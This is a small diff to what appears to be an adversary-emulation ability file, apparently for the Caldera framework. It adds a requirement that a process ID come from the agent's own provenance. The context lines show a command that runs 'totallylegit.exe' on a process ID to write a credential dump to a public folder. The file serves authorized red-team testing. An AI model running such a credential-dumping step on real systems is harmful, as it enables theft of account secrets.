@@ -13,4 +13,7 @@
         command: |
           .\totallylegit.exe #{host.process.id} C:\Users\Public\creds.dmp
         payload: totallylegit.exe
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.process.id
 
